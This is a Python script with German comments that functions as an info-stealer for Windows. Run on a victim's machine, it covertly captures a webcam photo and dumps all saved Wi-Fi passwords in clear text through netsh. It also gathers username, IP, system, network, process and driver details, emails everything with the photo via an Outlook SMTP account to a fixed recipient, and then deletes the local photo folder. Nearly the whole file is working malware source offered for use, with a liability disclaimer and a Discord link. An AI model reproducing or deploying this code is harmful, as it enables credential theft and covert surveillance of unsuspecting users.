smtp_server = "smtp-mail.outlook.com"
smtp_port = 587
sender_email = "sender@outlook.com"
sender_password = "password"
recipient_email = "recipient@example.com"



import smtplib
import getpass
import subprocess
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import cv2
import os
import shutil

version = "Version: 1.3.3" #Die aktuelle version des programms

def check_camera():
    try:
        # Camera index (usually 0 for the first camera)
        camera_index = 0

        # Check if the camera is available
        camera = cv2.VideoCapture(camera_index)
        if not camera.isOpened():
            raise Exception("Error: No camera found.")

        # Capture an image
        ret, frame = camera.read()
        if not ret:
            raise Exception("Error: Failed to capture the image.")

        # Output directory for saving the image
        output_dir = "C:\\camera\\pictures"  # Specify the desired folder path here
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        # Save the image
        output_path = os.path.join(output_dir, "captured_image.jpg")
        cv2.imwrite(output_path, frame)

        camera.release()

        # Create and return the image attachment
        with open(output_path, "rb") as file:
            image_attachment = MIMEImage(file.read())
            image_attachment.add_header("Content-Disposition", "attachment", filename="camera_picture.png")

        return image_attachment
    except Exception as e:
        return f"Error: {str(e)}"

image_attachment = check_camera()

def get_wifi_passwords():
    try:
        # Befehl für die Abfrage der WLAN-Profile
        command = 'netsh wlan show profile'

        # Ausführen des Befehls und Erfassen der Ausgabe
        process = subprocess.run(command, capture_output=True)

        # Überprüfen, ob die Ausführung erfolgreich war
        if process.returncode == 0:
            # Zeichenkodierung der Ausgabe ermitteln
            encoding = chardet.detect(process.stdout)['encoding']

            # Ausgabe in der erkannten Zeichenkodierung decodieren
            output = process.stdout.decode(encoding)

            # WLAN-Profile aus der Ausgabe extrahieren
            profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]

            # WLAN-Passwörter sammeln
            passwords = {}
            for profile in profiles:
                # Befehl für die Abfrage des WLAN-Passworts
                password_command = f'netsh wlan show profile name="{profile}" key=clear'

                # Ausführen des Befehls und Erfassen der Ausgabe
                password_process = subprocess.run(password_command, capture_output=True)

                # Überprüfen, ob die Ausführung erfolgreich war
                if password_process.returncode == 0:
                    # Zeichenkodierung der Ausgabe ermitteln
                    password_encoding = chardet.detect(password_process.stdout)['encoding']

                    # Ausgabe in der erkannten Zeichenkodierung decodieren
                    password_output = password_process.stdout.decode(password_encoding)

                    # WLAN-Passwort aus der Ausgabe extrahieren
                    password_lines = [line.strip() for line in password_output.splitlines() if "Key Content" in line]
                    if password_lines:
                        password = password_lines[0].split(":")[1].strip()
                        passwords[profile] = password

            return passwords
        else:
            return {}
    except Exception as e:
        return {}

# WLAN-Passwörter abrufen
passwords = get_wifi_passwords()

# Inhalt der E-Mail
ausegelesene_wlan_passwörter = "Extracted WLAN passwords:\n\n"
try:
    for wifi, password in passwords.items():
        ausegelesene_wlan_passwörter += f"WLAN: {wifi}\nPassword: {password}\n\n"
except Exception as e:
    ausegelesene_wlan_passwörter += f'Error while retrieving WLAN passwords: {str(e)}'

# Restlicher Code zur Erstellung und Versendung der E-Mail (unverändert) ...


def benutzer():
    aktueller_benutzer = getpass.getuser()    # Den Benutzernamen des aktuellen Benutzers abrufen
    return f"{aktueller_benutzer}"

def ip_addresse():

    # Den Hostnamen des Geräts abrufen
    hostname = socket.gethostname()

    # Die IP-Adresse des Geräts abrufen
    ip_address = socket.gethostbyname(hostname)
    return f"{ip_address}"

def ipconfig1():
    try:
        # Befehl für die Abfrage der Netzwerkkonfiguration
        command = "ipconfig /all"

        # Ausführen des Befehls und Erfassen der Ausgabe
        process = subprocess.run(command, capture_output=True, text=True, encoding='cp850', shell=True)

        # Ausgabe der Netzwerkkonfiguration
        return process.stdout
    except Exception as e:
        return f'"ipconfig /all" did not work.\nError:\n{str(e)}'

def ipconfig2():
    output_ipconfig = f"""
    """
    import socket
    import uuid

    # Funktion zum Abrufen der IP-Adresse einer Netzwerkschnittstelle
    def get_ip_address(ifname):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            ip_address = socket.inet_ntoa(socket.inet_aton(socket.inet_ntoa(sock.getsockname()[0])) &
                                          socket.inet_aton(socket.inet_ntoa(sock.getsockname()[1])))
            return ip_address
        except IOError:
            return None

    # Funktion zum Abrufen der MAC-Adresse einer Netzwerkschnittstelle
    def get_mac_address():
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                                for ele in range(0, 8 * 6, 8)][::-1])
        return mac_address

    # Liste der Netzwerkschnittstellen abrufen
    network_interfaces = socket.if_nameindex()

    # Netzwerkkonfiguration abrufen
    network_config = []
    for interface in network_interfaces:
        interface_name = interface[1]
        ip_address = get_ip_address(interface_name)
        mac_address = get_mac_address()
        network_config.append({
            'interface_name': interface_name,
            'ip_address': ip_address,
            'mac_address': mac_address
        })

    # Ausgabe der Netzwerkkonfiguration
    for config in network_config:
        output_ipconfig += f"Interface: {config['interface_name']}\n"
        output_ipconfig += f"IP Address: {config['ip_address']}\n"
        output_ipconfig += f"MAC Address: {config['mac_address']}\n\n"

    return output_ipconfig

def systeminfo():
    try:
        # Befehl für die Abfrage der Netzwerkkonfiguration
        command = "systeminfo"

        # Ausführen des Befehls und Erfassen der Ausgabe
        process = subprocess.run(command, capture_output=True, text=True, encoding='cp850', shell=True)

        # Ausgabe der Netzwerkkonfiguration
        return process.stdout
    except Exception as e:
        return f'"systeminfo" did not work.\nError:\n{str(e)}'

def hostname():
    try:
        # Befehl für die Abfrage der Netzwerkkonfiguration
        command = "hostname"

        # Ausführen des Befehls und Erfassen der Ausgabe
        process = subprocess.run(command, capture_output=True, text=True, encoding='cp850', shell=True)

        # Ausgabe der Netzwerkkonfiguration
        return process.stdout
    except Exception as e:
        return f'"hostname" did not work.\nError:\n{str(e)}'

def tracert ():
    try:
        # Befehl für die Abfrage der Netzwerkkonfiguration
        command = "tracert youtube.com"

        # Ausführen des Befehls und Erfassen der Ausgabe
        process = subprocess.run(command, capture_output=True, text=True, encoding='cp850', shell=True)

        # Ausgabe der Netzwerkkonfiguration
        return process.stdout
    except Exception as e:
        return f'"tracert youtube.com" did not work.\nError:\n{str(e)}'

def netstat ():
    try:
        # Befehl für die Abfrage der Netzwerkkonfiguration
        command = "netstat"

        # Ausführen des Befehls und Erfassen der Ausgabe
        process = subprocess.run(command, capture_output=True, text=True, encoding='cp850', shell=True)

        # Ausgabe der Netzwerkkonfiguration
        return process.stdout
    except Exception as e:
        return f'"netstat" did not work.\nError:\n{str(e)}'

def tasklist ():
    try:
        # Befehl für die Abfrage der Netzwerkkonfiguration
        command = "tasklist"

        # Ausführen des Befehls und Erfassen der Ausgabe
        process = subprocess.run(command, capture_output=True, text=True, encoding='cp850', shell=True)

        # Ausgabe der Netzwerkkonfiguration
        return process.stdout
    except Exception as e:
        return f'"tasklist" did not work.\nError:\n{str(e)}'

def driverquery ():
    try:
        # Befehl für die Abfrage der Netzwerkkonfiguration
        command = "driverquery"

        # Ausführen des Befehls und Erfassen der Ausgabe
        process = subprocess.run(command, capture_output=True, text=True, encoding='cp850', shell=True)

        # Ausgabe der Netzwerkkonfiguration
        return process.stdout
    except Exception as e:
        return f'"driverquery" did not work.\nError:\n{str(e)}'

# Inhalt der E-Mail
BODY = f"""
{version}

Please note that the creator of this program assumes no liability for any actions taken by this program!

In the event of an error in this program, please kindly send it to my Discord server!

Discord: https://discord.gg/QpMdh2cT5z

---------------------------------------------------------------------------------------------------
IP Config 1:

{ipconfig1()}
---------------------------------------------------------------------------------------------------
IP Config 2:

{ipconfig2()}
---------------------------------------------------------------------------------------------------
systeminfo:

{systeminfo()}
---------------------------------------------------------------------------------------------------
hostname:

{hostname()}
---------------------------------------------------------------------------------------------------
tracert youtube.com:

{tracert()}
---------------------------------------------------------------------------------------------------
netstat:

{netstat()}
---------------------------------------------------------------------------------------------------
tasklist:

{tasklist()}
---------------------------------------------------------------------------------------------------
driverquery:

{driverquery()}
---------------------------------------------------------------------------------------------------
WLAN passwords:

{ausegelesene_wlan_passwörter}
---------------------------------------------------------------------------------------------------

Please note that the creator of this program assumes no liability for any actions taken by this program!

In the event of an error in this program, please kindly send it to my Discord server!

Discord: https://discord.gg/QpMdh2cT5z
"""



SUBJECT = f"Information from username: {benutzer()} IP address: {ip_addresse()}"  # Betreff der E-Mail

# E-Mail-Einstellungen
SMTP_SERVER = smtp_server  # SMTP-Server-Adresse
SMTP_PORT = smtp_port  # SMTP-Port (normalerweise 587)
SENDER_EMAIL = sender_email  # Absender-E-Mail-Adresse
SENDER_PASSWORD = sender_password  # Passwort des Absender-Kontos
RECIPIENT_EMAIL = recipient_email  # Empfänger-E-Mail-Adresse

# Erstellen der E-Mail-Nachricht
message = MIMEMultipart()
message["From"] = SENDER_EMAIL
message["To"] = RECIPIENT_EMAIL
message["Subject"] = SUBJECT

message.attach(MIMEText(BODY, "plain"))
try:
    with open("C:\\camera\\pictures\\captured_image.jpg", "rb") as attachment:
        image_attachment = MIMEImage(attachment.read())
        message.attach(image_attachment)
except Exception as e:
    message.attach(MIMEText(f"Error: {e}"))

# Verbindung zum SMTP-Server herstellen
server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
server.starttls()  # TLS-Verschlüsselung aktivieren
server.login(SENDER_EMAIL, SENDER_PASSWORD)  # Konto anmelden

# E-Mail versenden
server.send_message(message)

# Verbindung zum SMTP-Server trennen
server.quit()

try:
    shutil.rmtree("C:\\camera")
except:
    pass
